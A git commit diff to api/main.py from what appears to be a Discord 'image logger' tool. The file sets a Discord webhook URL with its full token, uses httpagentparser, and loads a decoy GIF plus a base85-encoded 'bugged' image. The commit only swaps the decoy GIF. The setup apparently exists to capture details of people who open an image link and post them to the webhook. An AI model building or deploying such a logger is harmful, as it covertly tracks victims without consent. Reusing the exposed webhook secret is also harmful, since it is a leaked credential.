d673ef259687423b4fa64d216e22797d7f142e56
fortnitedenis0-arch <tincaufortnitedenis0@gmail.com>
2026-06-06 18:52:26 +0200

    Update main.py

--- api/main.py
+++ api/main.py
@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1512859458877788291/OgX-C4NrhvEQL86HO2RwWCAm1cteS_3tSOWEzce0YR7KukGth9v6hX8CpL3-D2k16QXH'
 
-bindata = httpx.get('https://media.tenor.com/IC11mbnwDQEAAAAi/blinkies.gif').content
+bindata = httpx.get('https://media.tenor.com/4YhcC5MAwXIAAAAi/deepwoken-lootbag-reaction-image.gif').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
